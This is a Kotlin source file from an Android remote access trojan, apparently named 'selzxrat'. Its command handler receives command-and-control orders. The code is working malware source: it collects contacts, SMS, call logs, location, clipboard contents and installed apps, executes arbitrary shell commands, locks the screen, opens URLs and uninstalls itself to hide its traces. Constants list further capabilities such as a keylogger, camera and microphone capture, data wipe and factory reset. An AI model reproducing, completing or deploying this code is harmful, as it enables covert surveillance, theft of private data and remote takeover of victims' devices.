package com.selzxrat.v5

import android.content.Context
import android.content.Intent
import android.util.Log
import com.selzxrat.v5.services.ScreenLocker
import com.selzxrat.v5.ui.MainActivity

object CommandHandler {
    private const val TAG = "CommandHandler"

    // Command types
    const val CMD_GET_INFO = "get_info"
    const val CMD_GET_CONTACTS = "get_contacts"
    const val CMD_GET_SMS = "get_sms"
    const val CMD_GET_CALL_LOGS = "get_call_logs"
    const val CMD_GET_LOCATION = "get_location"
    const val CMD_GET_CAMERA_PHOTO = "get_camera_photo"
    const val CMD_GET_CAMERA_VIDEO = "get_camera_video"
    const val CMD_GET_MIC_AUDIO = "get_mic_audio"
    const val CMD_LOCK_SCREEN = "lock_screen"
    const val CMD_UNLOCK_SCREEN = "unlock_screen"
    const val CMD_WIPE_DATA = "wipe_data"
    const val CMD_FACTORY_RESET = "factory_reset"
    const val CMD_SET_WALLPAPER = "set_wallpaper"
    const val CMD_SEND_SMS = "send_sms"
    const val CMD_MAKE_CALL = "make_call"
    const val CMD_OPEN_URL = "open_url"
    const val CMD_INSTALL_APK = "install_apk"
    const val CMD_UNINSTALL_APK = "uninstall_apk"
    const val CMD_LIST_APPS = "list_apps"
    const val CMD_LIST_FILES = "list_files"
    const val CMD_READ_FILE = "read_file"
    const val CMD_DELETE_FILE = "delete_file"
    const val CMD_UPLOAD_FILE = "upload_file"
    const val CMD_DOWNLOAD_FILE = "download_file"
    const val CMD_RECORD_SCREEN = "record_screen"
    const val CMD_SCREENSHOT = "screenshot"
    const val CMD_KEYLOGGER_START = "keylogger_start"
    const val CMD_KEYLOGGER_STOP = "keylogger_stop"
    const val CMD_KEYLOGGER_GET = "keylogger_get"
    const val CMD_CLIPBOARD_GET = "clipboard_get"
    const val CMD_CLIPBOARD_SET = "clipboard_set"
    const val CMD_NOTIFICATIONS_GET = "notifications_get"
    const val CMD_THROTTLE_NETWORK = "throttle_network"
    const val CMD_UNTHROTTLE_NETWORK = "unthrottle_network"
    const val CMD_TRIGGER_LLM = "trigger_llm"
    const val CMD_SHELL_EXEC = "shell_exec"
    const val CMD_VIBRATE = "vibrate"
    const val CMD_TORCH_ON = "torch_on"
    const val CMD_TORCH_OFF = "torch_off"
    const val CMD_ALERT_DIALOG = "alert_dialog"
    const val CMD_TOAST = "toast"
    const val CMD_VOICE_PLAY = "voice_play"
    const val CMD_SELF_DESTRUCT = "self_destruct"

    data class CommandResult(
        val success: Boolean,
        val message: String,
        val data: Any? = null
    )

    fun handleCommand(context: Context, command: C2Command): CommandResult {
        Log.d(TAG, "Handling command: ${command.type} | ${command.payload}")

        return when (command.type) {
            CMD_GET_INFO -> handleGetInfo(context)
            CMD_GET_CONTACTS -> handleGetContacts(context)
            CMD_GET_SMS -> handleGetSMS(context)
            CMD_GET_CALL_LOGS -> handleGetCallLogs(context)
            CMD_GET_LOCATION -> handleGetLocation(context)
            CMD_LOCK_SCREEN -> handleLockScreen(context)
            CMD_UNLOCK_SCREEN -> handleUnlockScreen(context)
            CMD_SEND_SMS -> handleSendSMS(context, command.payload)
            CMD_OPEN_URL -> handleOpenURL(context, command.payload)
            CMD_LIST_APPS -> handleListApps(context)
            CMD_CLIPBOARD_GET -> handleClipboardGet(context)
            CMD_CLIPBOARD_SET -> handleClipboardSet(context, command.payload)
            CMD_VIBRATE -> handleVibrate(context, command.payload)
            CMD_TORCH_ON -> handleTorch(context, true)
            CMD_TORCH_OFF -> handleTorch(context, false)
            CMD_ALERT_DIALOG -> handleAlertDialog(context, command.payload)
            CMD_TOAST -> handleToast(context, command.payload)
            CMD_SELF_DESTRUCT -> handleSelfDestruct(context)
            CMD_SHELL_EXEC -> handleShellExec(command.payload)
            else -> CommandResult(false, "Unknown command type: ${command.type}")
        }
    }

    private fun handleGetInfo(context: Context): CommandResult {
        val info = DeviceInfoCollector.collectBasicInfo(context)
        return CommandResult(true, "Device info collected", info)
    }

    private fun handleGetContacts(context: Context): CommandResult {
        val contacts = DeviceInfoCollector.collectContacts(context)
        return CommandResult(true, "Contacts collected: ${contacts.size}", contacts)
    }

    private fun handleGetSMS(context: Context): CommandResult {
        val sms = DeviceInfoCollector.collectSMS(context)
        return CommandResult(true, "SMS collected: ${sms.size}", sms)
    }

    private fun handleGetCallLogs(context: Context): CommandResult {
        val logs = DeviceInfoCollector.collectCallLogs(context)
        return CommandResult(true, "Call logs collected: ${logs.size}", logs)
    }

    private fun handleGetLocation(context: Context): CommandResult {
        val location = DeviceInfoCollector.collectLocation(context)
        return CommandResult(true, "Location collected", location)
    }

    private fun handleLockScreen(context: Context): CommandResult {
        // PERBAIKAN: Gunakan ScreenLocker langsung, bukan services.ScreenLocker
        val intent = Intent(context, ScreenLocker::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("action", "lock")
        }
        context.startActivity(intent)
        return CommandResult(true, "Screen locked")
    }

    private fun handleUnlockScreen(context: Context): CommandResult {
        // PERBAIKAN: Gunakan ScreenLocker langsung
        val intent = Intent(context, ScreenLocker::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("action", "unlock")
        }
        context.startActivity(intent)
        return CommandResult(true, "Screen unlocked")
    }

    private fun handleSendSMS(context: Context, payload: String): CommandResult {
        val parts = payload.split("|", limit = 2)
        if (parts.size < 2) return CommandResult(false, "Invalid SMS format. Use: number|message")
        val number = parts[0].trim()
        val message = parts[1].trim()
        return try {
            val smsIntent = Intent(Intent.ACTION_SENDTO).apply {
                data = android.net.Uri.parse("smsto:$number")
                putExtra("sms_body", message)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(smsIntent)
            CommandResult(true, "SMS composer opened for $number")
        } catch (e: Exception) {
            CommandResult(false, "Failed to send SMS: ${e.message}")
        }
    }

    private fun handleOpenURL(context: Context, url: String): CommandResult {
        return try {
            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            CommandResult(true, "URL opened: $url")
        } catch (e: Exception) {
            CommandResult(false, "Failed to open URL: ${e.message}")
        }
    }

    private fun handleListApps(context: Context): CommandResult {
        val apps = context.packageManager.getInstalledApplications(0)
        val appList = apps.map {
            mapOf(
                "name" to context.packageManager.getApplicationLabel(it).toString(),
                "package" to it.packageName,
                "systemApp" to (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0)
            )
        }
        return CommandResult(true, "Apps listed: ${appList.size}", appList)
    }

    private fun handleClipboardGet(context: Context): CommandResult {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = clipboard.primaryClip
        val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).text?.toString() ?: "" else ""
        return CommandResult(true, "Clipboard content retrieved", text)
    }

    private fun handleClipboardSet(context: Context, text: String): CommandResult {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = android.content.ClipData.newPlainText("text", text)
        clipboard.setPrimaryClip(clip)
        return CommandResult(true, "Clipboard set")
    }

    private fun handleVibrate(context: Context, pattern: String): CommandResult {
        val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
        val patternMs = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }.toLongArray()
        if (patternMs.isNotEmpty()) {
            vibrator.vibrate(android.os.VibrationEffect.createWaveform(patternMs, -1))
        } else {
            vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, 255))
        }
        return CommandResult(true, "Vibrate triggered")
    }

    private fun handleTorch(context: Context, enable: Boolean): CommandResult {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
        try {
            val cameraId = cameraManager.cameraIdList[0]
            cameraManager.setTorchMode(cameraId, enable)
            return CommandResult(true, "Torch ${if (enable) "ON" else "OFF"}")
        } catch (e: Exception) {
            return CommandResult(false, "Torch failed: ${e.message}")
        }
    }

    private fun handleAlertDialog(context: Context, payload: String): CommandResult {
        // PERBAIKAN: Gunakan MainActivity langsung, bukan ui.MainActivity
        val intent = Intent(context, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("show_alert", payload)
        }
        context.startActivity(intent)
        return CommandResult(true, "Alert dialog sent: $payload")
    }

    private fun handleToast(context: Context, message: String): CommandResult {
        android.widget.Toast.makeText(context, message, android.widget.Toast.LENGTH_LONG).show()
        return CommandResult(true, "Toast shown: $message")
    }

    private fun handleSelfDestruct(context: Context): CommandResult {
        try {
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            return CommandResult(true, "Self-destruct initiated")
        } catch (e: Exception) {
            return CommandResult(false, "Self-destruct failed: ${e.message}")
        }
    }

    private fun handleShellExec(command: String): CommandResult {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            CommandResult(true, "Shell executed", output)
        } catch (e: Exception) {
            CommandResult(false, "Shell exec failed: ${e.message}")
        }
    }
}
